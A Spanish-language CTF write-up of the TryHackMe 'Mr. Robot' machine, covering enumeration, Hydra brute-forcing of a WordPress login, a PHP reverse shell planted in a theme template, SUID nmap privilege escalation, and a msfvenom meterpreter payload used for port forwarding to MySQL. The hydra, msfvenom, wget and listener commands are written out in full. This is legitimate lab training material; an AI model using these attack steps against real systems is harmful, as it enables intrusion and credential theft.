---
title: Mr. Robot
date: 2025-12-16 12:03:00 +/-TTTT
categories: [Máquinas Tryhackme,medium]
tags: [CTF,tryhackme]     # TAG names should always be lowercase

description: Resolución de la máquina Mr. Robot
---

![img-description](/assets/img/mr_robot/portada.png)
_Image Caption_

## Descripción

Máquina de nivel "medium", donde se aplicarán conceptos de enumeración, fuzzing de directorios, fuerza bruta, explotación de vulnerabilidades y un extra para mostrar como funciona el portfwd con metasploit.

## Contexto

¿Podremos conseguir ser root en esta maquina al estilo de la serie Mr. Robot?. Hay 3 llaves ocultas ubicadas en la máquina, ¿puedes encontrarlas?.

### Escaneo de puertos

Lo primero que haremos es un escaneo de los puertos, donde nos encontramos 3 servicios abiertos: 22 (SSH), 80 (HTTP) y 443 (HTTPS)

![img-description](/assets/img/mr_robot/nmap.png)

### Incursionando en el puerto 80

Veremosque nos entrega el puerto 80 para ver si nos entrega mas información, ya que, al no tener credenciales no podremos acceder al servicio SSH.
Vemos que hay una página que al parecer nos proporciona una simulación de ttyl donde podemos ingresar comandos ya predeterminados para poder navegar por la página.

![img-description](/assets/img/mr_robot/webindex.png)

Al probar todos los comandos que nos ofrece la página podemos ver que solo son imagenes y videos que solo es para meternos en la historia de la serie de Mr. Robot, pero no hay nada que podamos rescatar.

![img-description](/assets/img/mr_robot/join.png)

Podriamos hacer fuzzing de directorios por si encontramos algo más.

Esto se puede hacer de varias formas, con herramientas como dirb, gobuster, incluso con nmap y varias herramientas más.

Probaremos con nmap, donde encontramos diversos directorios interesantes como lo es "robots.txt y "wp-login.php" por lo que se intuye que estaríamos en presencia de un Blog Wordpress

![img-description](/assets/img/mr_robot/fuzzing.png)

Al ingresar a /robots.txt nos encontramos con 2 archivos, "fsocity.dic" que parece ser un diccionario y "key-1-of-3.txt" que al parecer es la primera key a descubrir!

![img-description](/assets/img/mr_robot/robots.png)

Veamos que contiene el archivo "key-1-of-3.txt" y por supuesto!!! es nuestra primera key, vamos en buen camino.

![img-description](/assets/img/mr_robot/key1.png)

Sigamos revisando el otro archivo "fsocity.dic" y claro, lo que suponiamos, es un diccionario. Lo guardaremos por si tenemos que ocuparlo.

![img-description](/assets/img/mr_robot/dic.png)

Ahora veamos el otro directorio interesante que encontramos con nmap, "wp-login.php". Y efectivamente es portal de login tipico de Wordpress.

![img-description](/assets/img/mr_robot/login.png)

Probaremos tratando de ingresar con usuarios y contraseñas comunes para ver si tenemos suerte, veamos con "admin", "admin". Y podemos apreciar que no tuvimos exito, pero observemos bien, el error que nos da es que el usuario en invalido, esto es un error de seguridad de Worpress en versiones antiguas, porque ahora podremos hacer fuerza bruta a este portal de login aprovechandonos de este error.

![img-description](/assets/img/mr_robot/error.png)

Para eso ocuparemos la herramienta hydra y el diccionario que encontramos en los pasos anteriores. Lo primero que haremos es ver la cantidad de palabras que tiene y si hay palabras repetidas en el diccionario, ya que si lo tiene nos perjdicaría en el tiempo que tomará hacer la fuerza bruta. Con wc -l podemos ver la cantidad de palabras y con grep ver si hay palabras repetidas.
Se puede apreciar que contiene 858161 palabras, pero tambien varias repetidas como se ve a simple vista con la palabra admin.

![img-description](/assets/img/mr_robot/repetidos.png)

Lo que haremos es ordenar este diccionario en orden alfabetico y sin palabras repetidas y lo guardaremos en un texto llamado dicc.txt
Esto se hace de la siguiente manera, sort fsocity.dic | uniq > dicc.txt.
Como se puede apreciar, ahora está ordenado y se redujo considerablemente la cantidad de palabras con un total de 11452 palabras sin repetirse.

![img-description](/assets/img/mr_robot/dicfinal.png)

Volvamos a nuestro login de Wordpress para tratar de acceder, lo primero que haremos es ingresar cualquier credencial para inducir el error y luego meternos en "Inspeccionar" con click derecho, y en el apartado de "red" nos vamos al "POST" que se generó. Luego a la derecha de todo veremos un apartado de "solicitud" donde veremos parametros como lo son "log", "pwd" y "wp-submit", que serán importantes tenerlos en cuenta.

![img-description](/assets/img/mr_robot/red.png)

Con hydra podremos hacer fuerza bruta aprovechando el mensaje de error qie no da el login de wordpress al fallar nuestro intento y con los parámetros anteriores podemos buscar que usuario es valido dentro de su base de datos de Wordpress, el comando es el siguiente:

hydra -L dicc.txt -p admin 10.67.184.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

Como se puede ver en la siguiente imagen, se encontró un usuario valido llamado "elliot"

![img-description](/assets/img/mr_robot/hydra.png)

Ahora que ya tenemos el usuario veamos si podemos sacar el password. Atentos al texto de error que arroja el portal de login al colocar un usuario correcto y un password erroneo, ya que ese texto tenemos que colocarlo en el parametro "F" de hydra.

![img-description](/assets/img/mr_robot/errorpass.png)

El comando de hydra quedaría así:

hydra -l elliot -P dicc.txt 10.67.184.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password"

Hemos encontrado la contraseña del usuario elliot, la contraseña es "ER28-0652".

![img-description](/assets/img/mr_robot/passtrue.png)

Ingresemos las credenciales y veamos con que nos encontramos.
Estamos en el Dahsboard del blog de Wordpress!!

![img-description](/assets/img/mr_robot/wordpress.png)

En versiones antiguas de Wordpress hay una vulnerabilidad donde podemos editar el tema, con esto podríamos editar el código php de uno de los templates y tratar de hacer una reverse shell. Para eso nos vamos al apartado de "Appearance", "Editor" y luego en el lado derecho de la página veremos los "Template". Nosotros editaremos el de 404 Template (El de error), pero la verdad es que puedes elegir el template que tu desees.

![img-description](/assets/img/mr_robot/404.png)

Ahora vamos a editar ese código y colocar un codigo php que nos permita una reverse shell.
Para eso usaremos la reverse shell.php que viene incluido en los recursos de kali.

![img-description](/assets/img/mr_robot/reverse.png)

Editamos nuestro código ingresando nuestra IP y un puerto a elegir, en mi caso colocaré el puerto 9001

![img-description](/assets/img/mr_robot/edit.png)

Copiamos todo el contenido de nuestro codigo recien editado y lo pegamos en el template 404 del Wordpress, luego le damos al botón 

![img-description](/assets/img/mr_robot/cambiado.png)

Dejaremos el puerto 9001 a la escucha con nc -lvnp 9001 e induciremos un error de not found en la pagina de wordpress para que haga efecto la reverse shell y listo, ya estamos dentro con el usuario "daemon" (cuenta del sistema para ejecutar programas "daemons")

![img-description](/assets/img/pickle_rick/dentro.png)

Ahora que podemos movernos mas comodamente podemos ver que en el directorio /home tenemos 2 directorios y posibles usuarios "robot" y "ubuntu", dentro del directorio robot encontramos 2 archivos, "key-2-of-3.txt" que no podemos ver su contenido porque no tenemos permisos de lectura y el archivo "password.raw-md5" que si podemos ver su contenido

![img-description](/assets/img/mr_robot/robot.png)

Al ver el contenido de "password.raw-md5" vemos que es una contraseña con hash MD5 que serviría para el usuario "robot"

![img-description](/assets/img/mr_robot/passrobot.png)

Con crackstation.net podemos deshashearlo y ver la password de "robot". y ahí la tenemos el password del usuario robot es "abcdefghijklmnopqrstuvwxyz".

![img-description](/assets/img/mr_robot/passfinal.png)

Veamos si podemos cambarnos al usuario "robot" y así poder leer la segunda key contenida en el archivo "key-2-of-3.txt".
Y ahí la tenemos, nuestra segunda key, solo nos falta una!!

![img-description](/assets/img/mr_robot/key2.png)

Al probar que permisos de sudo tenemos con el usuario "robot" con sudo -l, nos damos cuenta que no tenemos permitido ocupar "sudo". Habría que elevar privilegios de otra forma.

![img-description](/assets/img/mr_robot/sudo.png)

Veamos si tenemos binarios SUID que nos permitan elevar privilegios a root con el comando find / -perm -4000 2>/dev/null
Vemos un binario de nmap, podríamos ver si tiene alguna forma de escalar privilegios desde ahí.

![img-description](/assets/img/mr_robot/suid.png)

A tavés de la pagína gtfobins.github.io podemos ver que sí hay una forma de escalar privilegios de la siguiente manera

![img-description](/assets/img/mr_robot/gtfobins.png)

Pongamoslo a prueba!, y efectivamente si resulta...somos root!

![img-description](/assets/img/mr_robot/root.png)

Ahora solo nos queda ir al directorio root y sacar la ultima key que está en archivo "key-3-of-3.txt"

![img-description](/assets/img/mr_robot/key3.png)

## Lo hemos conseguido!!

Hemos podido conseguir todad las keys de la máquina Mr. Robot!!
Acá finalizamos esta aventura con Elliot y Mr Robot en esta entretenida máquina. ¿Quedará algo más por hacer?, sigue bajando que te tengo un extra!

![img-description](/assets/img/mr_robot/mascara.png)

## EXTRA PORFWD

Esto es algo extra y que no piden en tryhackme. Veremos como hacer portfwd con metasploit

Como sabemos tambien hay un puerto ssh abierto donde tambien podemos ingresar con las credenciales del usuario "robot" por si quieres trabajar desde ahí.

![img-description](/assets/img/mr_robot/ssh.png)

Lo que haremos a continuación es crearnos un payload con msfvenom para tener una shell meterpreter y así trabajar más comodo.
Con el comando msfvenos -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.186.5 LPORT=4444 -f elf -o shell.elf

![img-description](/assets/img/mr_robot/msfvenom.png)

Nos abriremos un servidor web loca con python para despues poder descargar desde la máquina Mr. Robot el "shell.elf" que hemos creado

![img-description](/assets/img/mr_robot/python.png)

Acuerdate antes de elevar privilegios con el método que ocupamos anteriormente (SUID nmap).
Para descargar el archivo solo hacemos un wget apuntando a nuestra dirección y archivo

![img-description](/assets/img/mr_robot/descargado.png)

Nos vamos a nuestro metasploit y ocuparemos el exploit/multi/handler, donde tendremos que editar el LHOST y LPORT, como tambien el payload para que sea el mismo que creamos con msfvenom y le damos "run"

![img-description](/assets/img/mr_robot/handler.png)

En la maquina de Mr. Robot le damos permisos de ejecución al archivo shell.elf y lo ejecutamos, esto hará que tengamos una conexión meterpreter desde nuestro mestasploit

![img-description](/assets/img/mr_robot/ejecutando.png)

![img-description](/assets/img/mr_robot/conectado.png)

Si nos damos cuenta al colocar dentro de la máquina Mr. Robot el comando "netstat -ano" para ver conexiones a la escucha de forma local, veremos que hay distintos puertos en listening como es el 3306 (mysql), 21 (ftp), entre otros. Nosotros trataremos de ingresar al servicio de base de datos. Pero para eso debemos ver donde se guardan las bases de datos en Wordpress

![img-description](/assets/img/mr_robot/netstat.png)

La base de datos de Worpress está ubicada en "/opt/bitnami/apps/wordpress/htdocs/wp-config.php". Veamos que contiene.
Tiene credenciales de usuarios de una base de datos!! usuario: 'bn_wordpress', password: '570fd42948'

![img-description](/assets/img/mr_robot/credenciales.png)

ICRearemos un portfwd

En meterpreter ingresaremos el siguiente comando "portfwd add -l 3306 -p 3306 -r 127.0.0.1"
Con "portfwd list" podemos ver que el comand se haya incluido"

![img-description](/assets/img/mr_robot/pwdactive.png)

Ahora desde nuestra propia terminal podemos ingresar a la base de datos con el siguiente comando "mysql -h 127.0.0.1  -u bn_wordpress -p --skip-ssl", donde podemos ver una base de datos llamada "bitnami_wordpress"

![img-description](/assets/img/mr_robot/databases.png)

Al ingresar a esa base de datos con "USE bitnami_wordpress;" y luego ver todas sus tablas con "SHOW tables;" podemos ver que hay una tabla llamada "wp_users"

![img-description](/assets/img/mr_robot/tables.png)

Y si ingresamos a esa tabla con "SELECT * FROM wp_users;" podemos ya tener acceso a todos los usuarios de la base de datos.

![img-description](/assets/img/mr_robot/tables.png)

Donde se encunetra el usuario "Elliot Alderson" y el usuario "Krista Gordon"

![img-description](/assets/img/mr_robot/usuariosdb.png)

Y así terminamos esta máquina. Espero que les haya parecido divertida, hasta la próxima!



